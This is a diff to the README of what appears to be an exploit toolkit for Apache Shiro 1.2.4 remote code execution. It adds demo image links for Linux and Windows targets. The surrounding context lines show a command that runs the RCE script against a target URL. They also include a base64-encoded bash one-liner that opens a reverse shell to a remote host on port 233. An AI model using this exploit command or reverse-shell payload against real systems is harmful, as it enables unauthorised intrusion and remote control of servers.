@@ -27,6 +27,11 @@
 ```
 python3 shiro-1.2.4_rce.py http://1.1.1.1:8080 "touch tmp/exphub"
 ```
+### Linux Server
+![Image](https://github.com/zhzyker/exphub/blob/master/shiro/image/linux-rce.gif)
+
+### Windows Server
+![Image](https://github.com/zhzyker/exphub/blob/master/shiro/image/windows-rce.gif)
 
 # Nc Shell
 
@@ -42,3 +47,5 @@ Encoding
 ```
 bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}
 ```
+
+![Image](https://github.com/zhzyker/exphub/blob/master/shiro/image/linux-shell.gif)
